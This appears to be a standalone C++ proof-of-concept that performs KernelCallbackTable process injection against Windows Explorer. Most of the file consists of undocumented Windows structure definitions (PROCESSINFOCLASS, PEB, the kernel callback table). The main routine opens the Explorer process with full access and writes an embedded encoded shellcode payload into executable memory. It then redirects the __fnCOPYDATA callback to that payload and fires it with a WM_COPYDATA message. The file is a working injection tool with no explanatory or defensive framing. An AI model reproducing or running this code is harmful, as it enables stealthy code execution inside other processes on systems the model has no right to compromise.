#include<Windows.h>
#include<iostream>
//#include<winternl.h>
using namespace std;

typedef enum _PROCESSINFOCLASS
{
    ProcessBasicInformation, // q: PROCESS_BASIC_INFORMATION, PROCESS_EXTENDED_BASIC_INFORMATION
    ProcessQuotaLimits, // qs: QUOTA_LIMITS, QUOTA_LIMITS_EX
    ProcessIoCounters, // q: IO_COUNTERS
    ProcessVmCounters, // q: VM_COUNTERS, VM_COUNTERS_EX, VM_COUNTERS_EX2
    ProcessTimes, // q: KERNEL_USER_TIMES
    ProcessBasePriority, // s: KPRIORITY
    ProcessRaisePriority, // s: ULONG
    ProcessDebugPort, // q: HANDLE
    ProcessExceptionPort, // s: PROCESS_EXCEPTION_PORT (requires SeTcbPrivilege)
    ProcessAccessToken, // s: PROCESS_ACCESS_TOKEN
    ProcessLdtInformation, // qs: PROCESS_LDT_INFORMATION // 10
    ProcessLdtSize, // s: PROCESS_LDT_SIZE
    ProcessDefaultHardErrorMode, // qs: ULONG
    ProcessIoPortHandlers, // (kernel-mode only) // s: PROCESS_IO_PORT_HANDLER_INFORMATION
    ProcessPooledUsageAndLimits, // q: POOLED_USAGE_AND_LIMITS
    ProcessWorkingSetWatch, // q: PROCESS_WS_WATCH_INFORMATION[]; s: void
    ProcessUserModeIOPL, // qs: ULONG (requires SeTcbPrivilege)
    ProcessEnableAlignmentFaultFixup, // s: BOOLEAN
    ProcessPriorityClass, // qs: PROCESS_PRIORITY_CLASS
    ProcessWx86Information, // qs: ULONG (requires SeTcbPrivilege) (VdmAllowed)
    ProcessHandleCount, // q: ULONG, PROCESS_HANDLE_INFORMATION // 20
    ProcessAffinityMask, // (q >WIN7)s: KAFFINITY, qs: GROUP_AFFINITY
    ProcessPriorityBoost, // qs: ULONG
    ProcessDeviceMap, // qs: PROCESS_DEVICEMAP_INFORMATION, PROCESS_DEVICEMAP_INFORMATION_EX
    ProcessSessionInformation, // q: PROCESS_SESSION_INFORMATION
    ProcessForegroundInformation, // s: PROCESS_FOREGROUND_BACKGROUND
    ProcessWow64Information, // q: ULONG_PTR
    ProcessImageFileName, // q: UNICODE_STRING
    ProcessLUIDDeviceMapsEnabled, // q: ULONG
    ProcessBreakOnTermination, // qs: ULONG
    ProcessDebugObjectHandle, // q: HANDLE // 30
    ProcessDebugFlags, // qs: ULONG
    ProcessHandleTracing, // q: PROCESS_HANDLE_TRACING_QUERY; s: PROCESS_HANDLE_TRACING_ENABLE[_EX] or void to disable
    ProcessIoPriority, // qs: IO_PRIORITY_HINT
    ProcessExecuteFlags, // qs: ULONG (MEM_EXECUTE_OPTION_*)
    ProcessTlsInformation, // PROCESS_TLS_INFORMATION // ProcessResourceManagement
    ProcessCookie, // q: ULONG
    ProcessImageInformation, // q: SECTION_IMAGE_INFORMATION
    ProcessCycleTime, // q: PROCESS_CYCLE_TIME_INFORMATION // since VISTA
    ProcessPagePriority, // qs: PAGE_PRIORITY_INFORMATION
    ProcessInstrumentationCallback, // s: PVOID or PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION // 40
    ProcessThreadStackAllocation, // s: PROCESS_STACK_ALLOCATION_INFORMATION, PROCESS_STACK_ALLOCATION_INFORMATION_EX
    ProcessWorkingSetWatchEx, // q: PROCESS_WS_WATCH_INFORMATION_EX[]; s: void
    ProcessImageFileNameWin32, // q: UNICODE_STRING
    ProcessImageFileMapping, // q: HANDLE (input)
    ProcessAffinityUpdateMode, // qs: PROCESS_AFFINITY_UPDATE_MODE
    ProcessMemoryAllocationMode, // qs: PROCESS_MEMORY_ALLOCATION_MODE
    ProcessGroupInformation, // q: USHORT[]
    ProcessTokenVirtualizationEnabled, // s: ULONG
    ProcessConsoleHostProcess, // qs: ULONG_PTR // ProcessOwnerInformation
    ProcessWindowInformation, // q: PROCESS_WINDOW_INFORMATION // 50
    ProcessHandleInformation, // q: PROCESS_HANDLE_SNAPSHOT_INFORMATION // since WIN8
    ProcessMitigationPolicy, // s: PROCESS_MITIGATION_POLICY_INFORMATION
    ProcessDynamicFunctionTableInformation, // s: PROCESS_DYNAMIC_FUNCTION_TABLE_INFORMATION
    ProcessHandleCheckingMode, // qs: ULONG; s: 0 disables, otherwise enables
    ProcessKeepAliveCount, // q: PROCESS_KEEPALIVE_COUNT_INFORMATION
    ProcessRevokeFileHandles, // s: PROCESS_REVOKE_FILE_HANDLES_INFORMATION
    ProcessWorkingSetControl, // s: PROCESS_WORKING_SET_CONTROL (requires SeDebugPrivilege)
    ProcessHandleTable, // q: ULONG[] // since WINBLUE
    ProcessCheckStackExtentsMode, // qs: ULONG // KPROCESS->CheckStackExtents (CFG)
    ProcessCommandLineInformation, // q: UNICODE_STRING // 60
    ProcessProtectionInformation, // q: PS_PROTECTION
    ProcessMemoryExhaustion, // s: PROCESS_MEMORY_EXHAUSTION_INFO // since THRESHOLD
    ProcessFaultInformation, // s: PROCESS_FAULT_INFORMATION
    ProcessTelemetryIdInformation, // q: PROCESS_TELEMETRY_ID_INFORMATION
    ProcessCommitReleaseInformation, // qs: PROCESS_COMMIT_RELEASE_INFORMATION
    ProcessDefaultCpuSetsInformation, // qs: SYSTEM_CPU_SET_INFORMATION[5]
    ProcessAllowedCpuSetsInformation, // qs: SYSTEM_CPU_SET_INFORMATION[5]
    ProcessSubsystemProcess,
    ProcessJobMemoryInformation, // q: PROCESS_JOB_MEMORY_INFO
    ProcessInPrivate, // q: BOOLEAN; s: void // ETW // since THRESHOLD2 // 70
    ProcessRaiseUMExceptionOnInvalidHandleClose, // qs: ULONG; s: 0 disables, otherwise enables
    ProcessIumChallengeResponse,
    ProcessChildProcessInformation, // q: PROCESS_CHILD_PROCESS_INFORMATION
    ProcessHighGraphicsPriorityInformation, // qs: BOOLEAN (requires SeTcbPrivilege)
    ProcessSubsystemInformation, // q: SUBSYSTEM_INFORMATION_TYPE // since REDSTONE2
    ProcessEnergyValues, // q: PROCESS_ENERGY_VALUES, PROCESS_EXTENDED_ENERGY_VALUES
    ProcessPowerThrottlingState, // qs: POWER_THROTTLING_PROCESS_STATE
    ProcessReserved3Information, // ProcessActivityThrottlePolicy // PROCESS_ACTIVITY_THROTTLE_POLICY
    ProcessWin32kSyscallFilterInformation, // q: WIN32K_SYSCALL_FILTER
    ProcessDisableSystemAllowedCpuSets, // s: BOOLEAN // 80
    ProcessWakeInformation, // q: PROCESS_WAKE_INFORMATION
    ProcessEnergyTrackingState, // qs: PROCESS_ENERGY_TRACKING_STATE
    ProcessManageWritesToExecutableMemory, // MANAGE_WRITES_TO_EXECUTABLE_MEMORY // since REDSTONE3
    ProcessCaptureTrustletLiveDump,
    ProcessTelemetryCoverage, // q: TELEMETRY_COVERAGE_HEADER; s: TELEMETRY_COVERAGE_POINT
    ProcessEnclaveInformation,
    ProcessEnableReadWriteVmLogging, // qs: PROCESS_READWRITEVM_LOGGING_INFORMATION
    ProcessUptimeInformation, // q: PROCESS_UPTIME_INFORMATION
    ProcessImageSection, // q: HANDLE
    ProcessDebugAuthInformation, // since REDSTONE4 // 90
    ProcessSystemResourceManagement, // s: PROCESS_SYSTEM_RESOURCE_MANAGEMENT
    ProcessSequenceNumber, // q: ULONGLONG
    ProcessLoaderDetour, // since REDSTONE5
    ProcessSecurityDomainInformation, // q: PROCESS_SECURITY_DOMAIN_INFORMATION
    ProcessCombineSecurityDomainsInformation, // s: PROCESS_COMBINE_SECURITY_DOMAINS_INFORMATION
    ProcessEnableLogging, // qs: PROCESS_LOGGING_INFORMATION
    ProcessLeapSecondInformation, // qs: PROCESS_LEAP_SECOND_INFORMATION
    ProcessFiberShadowStackAllocation, // s: PROCESS_FIBER_SHADOW_STACK_ALLOCATION_INFORMATION // since 19H1
    ProcessFreeFiberShadowStackAllocation, // s: PROCESS_FREE_FIBER_SHADOW_STACK_ALLOCATION_INFORMATION
    ProcessAltSystemCallInformation, // s: PROCESS_SYSCALL_PROVIDER_INFORMATION // since 20H1 // 100
    ProcessDynamicEHContinuationTargets, // s: PROCESS_DYNAMIC_EH_CONTINUATION_TARGETS_INFORMATION
    ProcessDynamicEnforcedCetCompatibleRanges, // s: PROCESS_DYNAMIC_ENFORCED_ADDRESS_RANGE_INFORMATION // since 20H2
    ProcessCreateStateChange, // since WIN11
    ProcessApplyStateChange,
    ProcessEnableOptionalXStateFeatures, // s: ULONG64 // optional XState feature bitmask
    ProcessAltPrefetchParam, // qs: OVERRIDE_PREFETCH_PARAMETER // App Launch Prefetch (ALPF) // since 22H1
    ProcessAssignCpuPartitions,
    ProcessPriorityClassEx, // s: PROCESS_PRIORITY_CLASS_EX
    ProcessMembershipInformation, // q: PROCESS_MEMBERSHIP_INFORMATION
    ProcessEffectiveIoPriority, // q: IO_PRIORITY_HINT // 110
    ProcessEffectivePagePriority, // q: ULONG
    ProcessSchedulerSharedData, // since 24H2
    ProcessSlistRollbackInformation,
    ProcessNetworkIoCounters, // q: PROCESS_NETWORK_COUNTERS
    ProcessFindFirstThreadByTebValue, // PROCESS_TEB_VALUE_INFORMATION
    MaxProcessInfoClass
} PROCESSINFOCLASS;

typedef struct _LSA_UNICODE_STRING {
    unsigned short  Length;
    unsigned short  MaximumLength;
    unsigned short* Buffer;
} LSA_UNICODE_STRING, * PLSA_UNICODE_STRING, UNICODE_STRING, * PUNICODE_STRING;

typedef struct _RTL_USER_PROCESS_PARAMETERS {
    UCHAR           Reserved1[16];
    PVOID           Reserved2[10];
    UNICODE_STRING  ImagePathName;
    UNICODE_STRING  CommandLine;
} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;

typedef struct _PEB_LDR_DATA {
    unsigned char  Reserved1[8];
    void* Reserved2[3];
    LIST_ENTRY     InMemoryOrderModuleList;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

typedef struct _PROCESS_BASIC_INFORMATION {
    PVOID Reserved1;
    PVOID PebBaseAddress;
    PVOID Reserved2[2];
    ULONG_PTR UniqueProcessId;
    PVOID Reserved3;
} PROCESS_BASIC_INFORMATION;


typedef struct _RTL_BITMAP
{
    ULONG SizeOfBitMap;
    ULONG* Buffer;
} RTL_BITMAP, * PRTL_BITMAP;

typedef struct _PEB
{
    BOOLEAN                      InheritedAddressSpace;             /*  00 */
    BOOLEAN                      ReadImageFileExecOptions;          /*  01 */
    BOOLEAN                      BeingDebugged;                     /*  02 */
    BOOLEAN                      SpareBool;                         /*  03 */
    HANDLE                       Mutant;                            /*  04 */
    HMODULE                      ImageBaseAddress;                  /*  08 */
    PPEB_LDR_DATA                LdrData;                           /*  0c */
    RTL_USER_PROCESS_PARAMETERS* ProcessParameters;                 /*  10 */
    PVOID                        SubSystemData;                     /*  14 */
    HANDLE                       ProcessHeap;                       /*  18 */
    PRTL_CRITICAL_SECTION        FastPebLock;                       /*  1c */
    PVOID /*PPEBLOCKROUTINE*/    FastPebLockRoutine;                /*  20 */
    PVOID /*PPEBLOCKROUTINE*/    FastPebUnlockRoutine;              /*  24 */
    ULONG                        EnvironmentUpdateCount;            /*  28 */
    PVOID                        KernelCallbackTable;               /*  2c */
    PVOID                        EventLogSection;                   /*  30 */
    PVOID                        EventLog;                          /*  34 */
    PVOID /*PPEB_FREE_BLOCK*/    FreeList;                          /*  38 */
    ULONG                        TlsExpansionCounter;               /*  3c */
    PRTL_BITMAP                  TlsBitmap;                         /*  40 */
    ULONG                        TlsBitmapBits[2];                  /*  44 */
    PVOID                        ReadOnlySharedMemoryBase;          /*  4c */
    PVOID                        ReadOnlySharedMemoryHeap;          /*  50 */
    PVOID* ReadOnlyStaticServerData;          /*  54 */
    PVOID                        AnsiCodePageData;                  /*  58 */
    PVOID                        OemCodePageData;                   /*  5c */
    PVOID                        UnicodeCaseTableData;              /*  60 */
    ULONG                        NumberOfProcessors;                /*  64 */
    ULONG                        NtGlobalFlag;                      /*  68 */
    BYTE                         Spare2[4];                         /*  6c */
    LARGE_INTEGER                CriticalSectionTimeout;            /*  70 */
    ULONG                        HeapSegmentReserve;                /*  78 */
    ULONG                        HeapSegmentCommit;                 /*  7c */
    ULONG                        HeapDeCommitTotalFreeThreshold;    /*  80 */
    ULONG                        HeapDeCommitFreeBlockThreshold;    /*  84 */
    ULONG                        NumberOfHeaps;                     /*  88 */
    ULONG                        MaximumNumberOfHeaps;              /*  8c */
    PVOID* ProcessHeaps;                      /*  90 */
    PVOID                        GdiSharedHandleTable;              /*  94 */
    PVOID                        ProcessStarterHelper;              /*  98 */
    PVOID                        GdiDCAttributeList;                /*  9c */
    PVOID                        LoaderLock;                        /*  a0 */
    ULONG                        OSMajorVersion;                    /*  a4 */
    ULONG                        OSMinorVersion;                    /*  a8 */
    ULONG                        OSBuildNumber;                     /*  ac */
    ULONG                        OSPlatformId;                      /*  b0 */
    ULONG                        ImageSubSystem;                    /*  b4 */
    ULONG                        ImageSubSystemMajorVersion;        /*  b8 */
    ULONG                        ImageSubSystemMinorVersion;        /*  bc */
    ULONG                        ImageProcessAffinityMask;          /*  c0 */
    ULONG                        GdiHandleBuffer[34];               /*  c4 */
    ULONG                        PostProcessInitRoutine;            /* 14c */
    PRTL_BITMAP                  TlsExpansionBitmap;                /* 150 */
    ULONG                        TlsExpansionBitmapBits[32];        /* 154 */
    ULONG                        SessionId;                         /* 1d4 */

} PEB, * PPEB;

typedef struct _KERNELCALLBACKTABLE_T {
    ULONG_PTR __fnCOPYDATA;
    ULONG_PTR __fnCOPYGLOBALDATA;
    ULONG_PTR __fnDWORD;
    ULONG_PTR __fnNCDESTROY;
    ULONG_PTR __fnDWORDOPTINLPMSG;
    ULONG_PTR __fnINOUTDRAG;
    ULONG_PTR __fnGETTEXTLENGTHS;
    ULONG_PTR __fnINCNTOUTSTRING;
    ULONG_PTR __fnPOUTLPINT;
    ULONG_PTR __fnINLPCOMPAREITEMSTRUCT;
    ULONG_PTR __fnINLPCREATESTRUCT;
    ULONG_PTR __fnINLPDELETEITEMSTRUCT;
    ULONG_PTR __fnINLPDRAWITEMSTRUCT;
    ULONG_PTR __fnPOPTINLPUINT;
    ULONG_PTR __fnPOPTINLPUINT2;
    ULONG_PTR __fnINLPMDICREATESTRUCT;
    ULONG_PTR __fnINOUTLPMEASUREITEMSTRUCT;
    ULONG_PTR __fnINLPWINDOWPOS;
    ULONG_PTR __fnINOUTLPPOINT5;
    ULONG_PTR __fnINOUTLPSCROLLINFO;
    ULONG_PTR __fnINOUTLPRECT;
    ULONG_PTR __fnINOUTNCCALCSIZE;
    ULONG_PTR __fnINOUTLPPOINT5_;
    ULONG_PTR __fnINPAINTCLIPBRD;
    ULONG_PTR __fnINSIZECLIPBRD;
    ULONG_PTR __fnINDESTROYCLIPBRD;
    ULONG_PTR __fnINSTRING;
    ULONG_PTR __fnINSTRINGNULL;
    ULONG_PTR __fnINDEVICECHANGE;
    ULONG_PTR __fnPOWERBROADCAST;
    ULONG_PTR __fnINLPUAHDRAWMENU;
    ULONG_PTR __fnOPTOUTLPDWORDOPTOUTLPDWORD;
    ULONG_PTR __fnOPTOUTLPDWORDOPTOUTLPDWORD_;
    ULONG_PTR __fnOUTDWORDINDWORD;
    ULONG_PTR __fnOUTLPRECT;
    ULONG_PTR __fnOUTSTRING;
    ULONG_PTR __fnPOPTINLPUINT3;
    ULONG_PTR __fnPOUTLPINT2;
    ULONG_PTR __fnSENTDDEMSG;
    ULONG_PTR __fnINOUTSTYLECHANGE;
    ULONG_PTR __fnHkINDWORD;
    ULONG_PTR __fnHkINLPCBTACTIVATESTRUCT;
    ULONG_PTR __fnHkINLPCBTCREATESTRUCT;
    ULONG_PTR __fnHkINLPDEBUGHOOKSTRUCT;
    ULONG_PTR __fnHkINLPMOUSEHOOKSTRUCTEX;
    ULONG_PTR __fnHkINLPKBDLLHOOKSTRUCT;
    ULONG_PTR __fnHkINLPMSLLHOOKSTRUCT;
    ULONG_PTR __fnHkINLPMSG;
    ULONG_PTR __fnHkINLPRECT;
    ULONG_PTR __fnHkOPTINLPEVENTMSG;
    ULONG_PTR __xxxClientCallDelegateThread;
    ULONG_PTR __ClientCallDummyCallback;
    ULONG_PTR __fnKEYBOARDCORRECTIONCALLOUT;
    ULONG_PTR __fnOUTLPCOMBOBOXINFO;
    ULONG_PTR __fnINLPCOMPAREITEMSTRUCT2;
    ULONG_PTR __xxxClientCallDevCallbackCapture;
    ULONG_PTR __xxxClientCallDitThread;
    ULONG_PTR __xxxClientEnableMMCSS;
    ULONG_PTR __xxxClientUpdateDpi;
    ULONG_PTR __xxxClientExpandStringW;
    ULONG_PTR __ClientCopyDDEIn1;
    ULONG_PTR __ClientCopyDDEIn2;
    ULONG_PTR __ClientCopyDDEOut1;
    ULONG_PTR __ClientCopyDDEOut2;
    ULONG_PTR __ClientCopyImage;
    ULONG_PTR __ClientEventCallback;
    ULONG_PTR __ClientFindMnemChar;
    ULONG_PTR __ClientFreeDDEHandle;
    ULONG_PTR __ClientFreeLibrary;
    ULONG_PTR __ClientGetCharsetInfo;
    ULONG_PTR __ClientGetDDEFlags;
    ULONG_PTR __ClientGetDDEHookData;
    ULONG_PTR __ClientGetListboxString;
    ULONG_PTR __ClientGetMessageMPH;
    ULONG_PTR __ClientLoadImage;
    ULONG_PTR __ClientLoadLibrary;
    ULONG_PTR __ClientLoadMenu;
    ULONG_PTR __ClientLoadLocalT1Fonts;
    ULONG_PTR __ClientPSMTextOut;
    ULONG_PTR __ClientLpkDrawTextEx;
    ULONG_PTR __ClientExtTextOutW;
    ULONG_PTR __ClientGetTextExtentPointW;
    ULONG_PTR __ClientCharToWchar;
    ULONG_PTR __ClientAddFontResourceW;
    ULONG_PTR __ClientThreadSetup;
    ULONG_PTR __ClientDeliverUserApc;
    ULONG_PTR __ClientNoMemoryPopup;
    ULONG_PTR __ClientMonitorEnumProc;
    ULONG_PTR __ClientCallWinEventProc;
    ULONG_PTR __ClientWaitMessageExMPH;
    ULONG_PTR __ClientWOWGetProcModule;
    ULONG_PTR __ClientWOWTask16SchedNotify;
    ULONG_PTR __ClientImmLoadLayout;
    ULONG_PTR __ClientImmProcessKey;
    ULONG_PTR __fnIMECONTROL;
    ULONG_PTR __fnINWPARAMDBCSCHAR;
    ULONG_PTR __fnGETTEXTLENGTHS2;
    ULONG_PTR __fnINLPKDRAWSWITCHWND;
    ULONG_PTR __ClientLoadStringW;
    ULONG_PTR __ClientLoadOLE;
    ULONG_PTR __ClientRegisterDragDrop;
    ULONG_PTR __ClientRevokeDragDrop;
    ULONG_PTR __fnINOUTMENUGETOBJECT;
    ULONG_PTR __ClientPrinterThunk;
    ULONG_PTR __fnOUTLPCOMBOBOXINFO2;
    ULONG_PTR __fnOUTLPSCROLLBARINFO;
    ULONG_PTR __fnINLPUAHDRAWMENU2;
    ULONG_PTR __fnINLPUAHDRAWMENUITEM;
    ULONG_PTR __fnINLPUAHDRAWMENU3;
    ULONG_PTR __fnINOUTLPUAHMEASUREMENUITEM;
    ULONG_PTR __fnINLPUAHDRAWMENU4;
    ULONG_PTR __fnOUTLPTITLEBARINFOEX;
    ULONG_PTR __fnTOUCH;
    ULONG_PTR __fnGESTURE;
    ULONG_PTR __fnPOPTINLPUINT4;
    ULONG_PTR __fnPOPTINLPUINT5;
    ULONG_PTR __xxxClientCallDefaultInputHandler;
    ULONG_PTR __fnEMPTY;
    ULONG_PTR __ClientRimDevCallback;
    ULONG_PTR __xxxClientCallMinTouchHitTestingCallback;
    ULONG_PTR __ClientCallLocalMouseHooks;
    ULONG_PTR __xxxClientBroadcastThemeChange;
    ULONG_PTR __xxxClientCallDevCallbackSimple;
    ULONG_PTR __xxxClientAllocWindowClassExtraBytes;
    ULONG_PTR __xxxClientFreeWindowClassExtraBytes;
    ULONG_PTR __fnGETWINDOWDATA;
    ULONG_PTR __fnINOUTSTYLECHANGE2;
    ULONG_PTR __fnHkINLPMOUSEHOOKSTRUCTEX2;
} KERNELCALLBACKTABLE;







using NtQueryInformationProcessPtr = NTSTATUS(NTAPI*)(
	HANDLE ProcessHandle, // Process handle for which information is to be retrieved.
	 PROCESSINFOCLASS ProcessInformationClass, // Type of process information to be retrieved
	 PVOID ProcessInformation, // Pointer to the buffer into which the function writes the requested information
	 ULONG ProcessInformationLength, // The size of the buffer pointed to by the 'ProcessInformation' parameter 
	 PULONG ReturnLength // Pointer to a variable in which the function returns the size of the requested information
	);
NtQueryInformationProcessPtr NtQueryInformationProcess_ME = (NtQueryInformationProcessPtr)GetProcAddress(GetModuleHandleA("ntdll.dll"),"NtQueryInformationProcess");








int main() {

	unsigned char payload[] =
		"\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef"
		"\xff\xff\xff\x48\xbb\x16\xd1\xa4\x20\x2d\x06\x77\xa3\x48"
		"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xea\x99\x27"
		"\xc4\xdd\xee\xb7\xa3\x16\xd1\xe5\x71\x6c\x56\x25\xf2\x40"
		"\x99\x95\xf2\x48\x4e\xfc\xf1\x76\x99\x2f\x72\x35\x4e\xfc"
		"\xf1\x36\x99\x2f\x52\x7d\x4e\x78\x14\x5c\x9b\xe9\x11\xe4"
		"\x4e\x46\x63\xba\xed\xc5\x5c\x2f\x2a\x57\xe2\xd7\x18\xa9"
		"\x61\x2c\xc7\x95\x4e\x44\x90\xf5\x68\xa6\x54\x57\x28\x54"
		"\xed\xec\x21\xfd\x8d\xf7\x2b\x16\xd1\xa4\x68\xa8\xc6\x03"
		"\xc4\x5e\xd0\x74\x70\xa6\x4e\x6f\xe7\x9d\x91\x84\x69\x2c"
		"\xd6\x94\xf5\x5e\x2e\x6d\x61\xa6\x32\xff\xeb\x17\x07\xe9"
		"\x11\xe4\x4e\x46\x63\xba\x90\x65\xe9\x20\x47\x76\x62\x2e"
		"\x31\xd1\xd1\x61\x05\x3b\x87\x1e\x94\x9d\xf1\x58\xde\x2f"
		"\xe7\x9d\x91\x80\x69\x2c\xd6\x11\xe2\x9d\xdd\xec\x64\xa6"
		"\x46\x6b\xea\x17\x01\xe5\xab\x29\x8e\x3f\xa2\xc6\x90\xfc"
		"\x61\x75\x58\x2e\xf9\x57\x89\xe5\x79\x6c\x5c\x3f\x20\xfa"
		"\xf1\xe5\x72\xd2\xe6\x2f\xe2\x4f\x8b\xec\xab\x3f\xef\x20"
		"\x5c\xe9\x2e\xf9\x69\x93\x71\x04\x91\x49\xe2\x96\x20\x2d"
		"\x47\x21\xea\x9f\x37\xec\xa1\xc1\xa6\x76\xa3\x16\x98\x2d"
		"\xc5\x64\xba\x75\xa3\x35\xf8\x64\x88\xe9\x8f\x36\xf7\x5f"
		"\x58\x40\x6c\xa4\xf7\x36\x19\x5a\xa6\x82\x27\xd2\xd3\x3b"
		"\x2a\xfc\xb9\xa5\x21\x2d\x06\x2e\xe2\xac\xf8\x24\x4b\x2d"
		"\xf9\xa2\xf3\x46\x9c\x95\xe9\x60\x37\xb7\xeb\xe9\x11\xec"
		"\xa9\xef\x4e\x88\x63\x5e\x58\x65\x61\x97\xec\x78\x7c\xf6"
		"\x2e\x71\x68\xa4\xc1\x1d\xb3\x57\x89\xe8\xa9\xcf\x4e\xfe"
		"\x5a\x57\x6b\x3d\x85\x59\x67\x88\x76\x5e\x50\x60\x60\x2f"
		"\x06\x77\xea\xae\xb2\xc9\x44\x2d\x06\x77\xa3\x16\x90\xf4"
		"\x61\x7d\x4e\xfe\x41\x41\x86\xf3\x6d\x1c\xc6\x1d\xae\x4f"
		"\x90\xf4\xc2\xd1\x60\xb0\xe7\x32\x85\xa5\x21\x65\x8b\x33"
		"\x87\x0e\x17\xa4\x48\x65\x8f\x91\xf5\x46\x90\xf4\x61\x7d"
		"\x47\x27\xea\xe9\x11\xe5\x70\x64\xf9\xbf\xee\x9f\x10\xe8"
		"\xa9\xec\x47\xcd\xda\xda\xee\x22\xdf\xf8\x4e\x46\x71\x5e"
		"\x2e\x6e\xab\x23\x47\xcd\xab\x91\xcc\xc4\xdf\xf8\xbd\x87"
		"\x16\xb4\x87\xe5\x9a\x8b\x93\xca\x3e\xe9\x04\xec\xa3\xe9"
		"\x2e\x4b\xa5\x6a\xdb\x24\xdb\xcd\x73\x72\x18\x51\xc2\xd6"
		"\x4f\x47\x06\x2e\xe2\x9f\x0b\x5b\xf5\x2d\x06\x77\xa3";


    //Get Handle
    SIZE_T payloadSize = sizeof(payload);
    HWND hWindow = FindWindow(L"Shell_TrayWnd", NULL);
    DWORD pid;
    GetWindowThreadProcessId(hWindow, &pid);
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
   
    //Read Peb
    PROCESS_BASIC_INFORMATION pbi;
    NtQueryInformationProcessPtr NtQueryInformationProcess_ME = (NtQueryInformationProcessPtr)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryInformationProcess");
    NtQueryInformationProcess_ME(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);
    PEB peb;

    ReadProcessMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), NULL);
    KERNELCALLBACKTABLE kct;
    ReadProcessMemory(hProcess, peb.KernelCallbackTable, &kct, sizeof(kct), NULL);


    //Write Shellcode to Target and point to that
    LPVOID payloadAddr = VirtualAllocEx(hProcess, NULL, payloadSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, payloadAddr, payload, payloadSize, NULL);
    LPVOID newKCTAddr = VirtualAllocEx(hProcess, NULL, sizeof(kct), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    kct.__fnCOPYDATA = (DWORD64)payloadAddr;
    WriteProcessMemory(hProcess, newKCTAddr, &kct, sizeof(kct), NULL);
    

    //restore and send message (WM_COPYDATA) cause execute our payload
    WriteProcessMemory(hProcess, (PBYTE)pbi.PebBaseAddress + offsetof(PEB, KernelCallbackTable), &newKCTAddr, sizeof(ULONG_PTR), NULL);
    COPYDATASTRUCT cds;
    WCHAR msg[] = L"Pwn";
    cds.dwData = 1;
    cds.cbData = lstrlen(msg) * 2;
    cds.lpData = msg;
    SendMessage(hWindow, WM_COPYDATA, 0,(LPARAM)&cds);
    printf("[+] Payload executed\n");

}